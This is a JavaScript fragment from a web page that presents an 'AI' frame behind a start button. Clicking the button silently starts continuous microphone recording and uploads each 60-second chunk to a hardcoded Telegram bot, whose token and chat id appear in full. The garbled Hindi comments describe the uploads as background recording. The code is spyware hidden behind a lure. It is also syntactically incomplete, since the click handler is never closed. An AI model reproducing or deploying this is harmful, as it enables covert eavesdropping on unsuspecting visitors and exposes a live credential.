    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";
        
        const startBtn = document.getElementById('startCover');
        const frame = document.getElementById('aiFrame');

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            frame.style.display = 'block';
            initAudio(); // ‡§ë‡§°‡§ø‡§Ø‡•ã ‡§∂‡•Å‡§∞‡•Ç

        // üé§ ‡§¨‡•à‡§ï‡§ó‡•ç‡§∞‡§æ‡§â‡§Ç‡§° ‡§ë‡§°‡§ø‡§Ø‡•ã ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó (‡§¨‡§ø‡§®‡§æ ‡§∞‡•Å‡§ï‡•á)
        async function initAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => chunks.push(e.data);
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", MY_ID);
                    fd.append("voice", blob, "voice.ogg");
                    
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                    
                    chunks = [];
                    if (stream.active) setTimeout(() => recorder.start(), 1000);
                };

                recorder.start();
                // ‡§π‡§∞ 60 ‡§∏‡•á‡§ï‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§ë‡§°‡§ø‡§Ø‡•ã ‡§´‡§æ‡§á‡§≤ ‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§™‡§∞ ‡§≠‡•á‡§ú‡•á‡§ó‡§æ
                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
            } catch (err) { 
                console.log("Permission Required"); 
            }
        }
